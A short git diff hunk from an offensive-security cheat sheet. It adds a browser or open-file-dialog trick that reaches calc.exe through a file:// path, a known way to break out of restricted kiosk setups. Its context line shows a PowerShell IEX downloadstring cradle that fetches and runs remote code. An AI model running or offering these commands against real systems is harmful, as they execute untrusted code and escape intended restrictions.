@@ -10,6 +10,13 @@ IEX(New-Object Net.WebClient).downloadstring('https://raw.githubusercontent.com/
 
 # CYBER CHEAT SHEET
 
+### DIVERS
+*******
+File access from browser or openfile dialogbox
+```
+file://c:/windows/system32/calc.exe
+```
+
 ### RECONNAISSANCE - ENUMERATION
 *******
 
